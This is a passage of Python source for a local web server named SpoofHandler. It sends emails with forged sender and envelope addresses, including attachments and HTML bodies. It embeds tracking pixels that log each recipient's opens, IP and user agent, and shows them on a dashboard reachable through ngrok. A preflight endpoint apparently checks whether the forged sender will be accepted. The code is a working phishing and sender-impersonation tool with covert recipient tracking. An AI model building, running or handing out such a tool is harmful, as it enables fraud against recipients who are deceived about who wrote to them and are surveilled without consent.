                        "time": open_time,
                        "ip": client_ip,
                        "ua": user_agent
                    })
                    entry = _track_store[track_id]
                    with _event_lock:
                        _event_log.append({
                            "type": "open", "time": open_time, "track_id": track_id,
                            "from": entry["from"], "to": entry["to"],
                            "subject": entry["subject"], "ip": client_ip
                        })
                    print(f"  📬 Email opened! track_id={track_id} from {client_ip}")
                else:
                    print(f"  ⚠ Unknown track_id={track_id} from {client_ip}")
            # Serve the 1x1 transparent GIF
            self.send_response(200)
            self.send_header("Content-Type", "image/gif")
            self.send_header("Content-Length", str(len(TRACKING_GIF)))
            self.send_header("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
            self.send_header("Pragma", "no-cache")
            self.send_header("Expires", "0")
            self.end_headers()
            self.wfile.write(TRACKING_GIF)
            return

        # ── Dashboard page (redirect to unified page with dashboard tab) ──
        if self.path == "/dashboard":
            self.send_response(302)
            self.send_header("Location", "/#dashboard")
            self.end_headers()
            return

        # ── Dashboard events API ──
        if self.path.startswith("/dashboard/events"):
            qs = self.path.split("?", 1)[1] if "?" in self.path else ""
            params = parse_qs(qs)
            since_idx = int(params.get("since", ["0"])[0])
            with _event_lock:
                events = _event_log[since_idx:]
                total = len(_event_log)
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Cache-Control", "no-cache")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(json.dumps({"events": events, "total": total}).encode())
            return

        # ── Status endpoint (ngrok check) ──
        if self.path == "/status":
            ngrok = get_ngrok_url()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Cache-Control", "no-cache")
            self.end_headers()
            self.wfile.write(json.dumps({"ngrok": ngrok}).encode())
            return

        # ── Track events polling endpoint ──
        if self.path.startswith("/track-events"):
            qs = self.path.split("?", 1)[1] if "?" in self.path else ""
            params = parse_qs(qs)
            track_id = params.get("id", [""])[0]
            with _track_lock:
                if track_id and track_id in _track_store:
                    result = _track_store[track_id]
                else:
                    # Return all tracked emails
                    result = {tid: {"from": v["from"], "to": v["to"], "subject": v["subject"],
                                    "sent_at": v["sent_at"], "open_count": len(v["opens"]),
                                    "opens": v["opens"]} for tid, v in _track_store.items()}
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Cache-Control", "no-cache")
            self.end_headers()
            self.wfile.write(json.dumps(result).encode())
            return

        if self.path.startswith("/preflight"):
            # Parse query params
            qs = self.path.split("?", 1)[1] if "?" in self.path else ""
            params = parse_qs(qs)
            from_addr = params.get("from_addr", [""])[0]
            to_addr = params.get("to_addr", [""])[0]
            envelope_from = params.get("envelope_from", [from_addr])[0]

            if not from_addr or not to_addr:
                result = {"error": "from_addr and to_addr required"}
            else:
                try:
                    result = run_preflight(from_addr, to_addr, envelope_from)
                except Exception as e:
                    result = {"error": str(e), "log": [traceback.format_exc()]}

            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps(result).encode())
        else:
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(HTML_PAGE.encode())

    def do_POST(self):
        if self.path != "/send":
            self.send_error(404)
            return

        content_type = self.headers.get("Content-Type", "")
        length = int(self.headers.get("Content-Length", 0))
        raw_body = self.rfile.read(length)

        if "multipart/form-data" in content_type:
            fields, attachments = _parse_multipart(content_type, raw_body)
            from_addr     = fields.get("from_addr", "")
            envelope_from = fields.get("envelope_from", "")
            to_addr       = fields.get("to_addr", "")
            subject       = fields.get("subject", "Test")
            body_text     = fields.get("body_text", "")
            body_html     = fields.get("body_html", "")
        else:
            params = parse_qs(raw_body.decode())
            from_addr     = params.get("from_addr", [""])[0]
            envelope_from = params.get("envelope_from", [""])[0]
            to_addr       = params.get("to_addr", [""])[0]
            subject       = params.get("subject", [""])[0]
            body_text     = params.get("body_text", [""])[0]
            body_html     = params.get("body_html", [""])[0]
            attachments   = []

        # Get the host the client used to reach us (for tracking pixel URL)
        server_host = self.headers.get("Host", f"localhost:{PORT}").split(":")[0]

        if not to_addr:
            result = {"success": False, "log": "Error: No recipient."}
        else:
            try:
                result = send_spoofed_email(
                    from_addr, to_addr, envelope_from,
                    subject, body_text, body_html, attachments, server_host
                )
            except Exception as e:
                result = {"success": False, "log": f"Error:\n{traceback.format_exc()}"}

        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(result).encode())


if __name__ == "__main__":
    server = HTTPServer(("0.0.0.0", PORT), SpoofHandler)
    print(f"\n  Spoof running at http://localhost:{PORT}")
    print(f"  Press Ctrl+C to stop.\n")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n  Stopped.")
        server.server_close()
